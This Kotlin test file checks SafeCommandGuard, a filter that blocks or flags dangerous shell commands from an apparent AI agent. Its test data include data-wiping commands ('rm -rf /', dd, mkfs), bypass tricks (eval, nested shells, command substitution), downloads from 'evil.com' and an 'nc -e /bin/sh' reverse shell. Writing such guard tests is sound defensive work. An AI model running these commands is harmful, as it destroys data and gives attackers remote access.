package com.aidev.six

import org.junit.Assert.assertEquals
import org.junit.Assert.assertFalse
import org.junit.Assert.assertTrue
import org.junit.Test

class SafeCommandGuardTest {

    private fun isAllowed(cmd: String): Boolean =
        SafeCommandGuard.check(cmd).verdict == SafeCommandGuard.Verdict.ALLOW

    @Test
    fun allowsNormalBuildCommand() {
        assertTrue(isAllowed("aidev-build"))
        assertTrue(isAllowed("./gradlew :app:assembleDebug"))
        assertTrue(isAllowed("ls -la /workspace"))
    }

    @Test
    fun blocksDangerousPatterns() {
        assertFalse(isAllowed("rm -rf /sdcard/AIDev"))
        assertFalse(isAllowed("rm -rf ."))
        assertFalse(isAllowed("git reset --hard"))
        assertFalse(isAllowed("git push --force"))
        assertFalse(isAllowed("dd if=/dev/zero of=/dev/sda"))
        assertFalse(isAllowed("mkfs.ext4 /data/foo"))
    }

    @Test
    fun allowsBenignCopiesToSdcard() {
        // cp/mv 到 /sdcard 是正常构建产物落盘，应放行
        assertTrue(isAllowed("cp app-debug.apk /sdcard/AIDev/"))
        assertTrue(isAllowed("mv build/outputs/apk /sdcard/AIDev/apk"))
    }

    @Test
    fun requiresConfirmForDestructiveWriteToProtectedPath() {
        val res = SafeCommandGuard.check("rm /sdcard/AIDev/old.apk")
        assertEquals(SafeCommandGuard.Verdict.REQUIRE_CONFIRM, res.verdict)
        val res2 = SafeCommandGuard.check("chmod 777 /sdcard/secrets")
        assertEquals(SafeCommandGuard.Verdict.REQUIRE_CONFIRM, res2.verdict)
    }

    @Test
    fun caseInsensitiveDangerousMatch() {
        assertFalse(isAllowed("RM -RF /SDCARD/X"))
        assertFalse(isAllowed("Git Push --Force"))
    }

    @Test
    fun blocksWhitespaceObfuscation() {
        // 多空格绕过（旧版只做小写子串匹配，会被 "rm  -rf /" 绕过）
        assertFalse(isAllowed("rm  -rf /"))
        assertFalse(isAllowed("rm   -rf    /data/foo"))
    }

    @Test
    fun blocksDdOfForm() {
        // 旧版只拦 "dd if="，漏拦 "dd of="
        assertFalse(isAllowed("dd of=/dev/sda if=/dev/zero"))
    }

    @Test
    fun blocksEvalAndNestedShell() {
        assertFalse(isAllowed("eval rm -rf /data"))
        assertFalse(isAllowed("sh -c \"rm -rf /\""))
        assertFalse(isAllowed("bash -c 'mkfs.ext4 /data/x'"))
    }

    @Test
    fun blocksCommandSubstitution() {
        assertFalse(isAllowed("cat \$(rm -rf /data/x)"))
        assertFalse(isAllowed("echo `rm -rf /data/x`"))
    }

    // ===== P2-8：非交互（agent）上下文可执行名白名单 =====

    @Test
    fun agentBlocksUnauthorizedExecutables() {
        val blocked = listOf(
            "python3 script.py",
            "node -e \"evil\"",
            "curl http://evil.com/x",
            "wget http://evil.com/x",
            "nc -e /bin/sh 1.2.3.4 4444",
            "telnet host",
            "bash ./unknown.sh",
        )
        for (cmd in blocked) {
            assertEquals("应拦截: $cmd", SafeCommandGuard.Verdict.BLOCK, SafeCommandGuard.check(cmd).verdict)
        }
    }

    @Test
    fun interactiveBypassesAllowlistButKeepsDangerousBlock() {
        // 交互会话不受白名单限制（用户手动），但危险模式仍拦截
        assertEquals(SafeCommandGuard.Verdict.ALLOW, SafeCommandGuard.check("python3 tool.py", interactive = true).verdict)
        assertEquals(SafeCommandGuard.Verdict.BLOCK, SafeCommandGuard.check("rm -rf /", interactive = true).verdict)
    }
}
